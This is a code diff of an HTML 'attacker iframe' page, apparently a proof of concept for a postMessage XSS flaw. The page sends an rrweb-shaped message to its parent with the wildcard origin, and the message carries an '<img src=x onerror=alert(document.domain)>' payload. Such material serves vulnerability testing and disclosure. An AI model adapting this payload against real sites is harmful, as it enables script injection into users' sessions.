@@ -4,18 +4,20 @@
     <title>Attacker Iframe (Sender)</title>
 </head>
 <body>
-    <h2>Iframe Window</h2>
-    <p>Attempting to send a malicious message to the parent...</p>
+    <h2>Attacker Iframe Window</h2>
+    <p style="color: blue;">This page is hosted on a different domain.</p>
 
     <script>
-        // The malicious payload containing the XSS vector
+        // The malicious payload crafted to match the rrweb structure
         const maliciousPayload = {
             type: "rrweb",
-           event: {
-        data: {
-            text: "<h1>Hacked!</h1><img src=x onerror=alert(document.domain)>" // No quotes needed around document.domain
-        }
-    }
+            event: {
+                data: {
+                    // XSS Payload: Will execute JS when the image fails to load (src=x)
+                    text: "<h1>Hacked!</h1><img src=x onerror=alert(document.domain)>"
+                }
+            },
+            // FIX: Added the necessary comma here to prevent SyntaxError
             origin: window.location.origin,
             isCheckout: false
         };
@@ -23,9 +25,7 @@
         // Send the malicious message to the parent with the wildcard origin ("*")
         if (window.parent !== window) {
             window.parent.postMessage(maliciousPayload, "*");
-            document.body.innerHTML += "<p style='color: green;'>Malicious message sent to parent!</p>";
-        } else {
-            document.body.innerHTML += "<p style='color: red;'>Not running in an iframe. Cannot send message.</p>";
+            console.log("Malicious message sent to parent via postMessage.");
         }
     </script>
 </body>
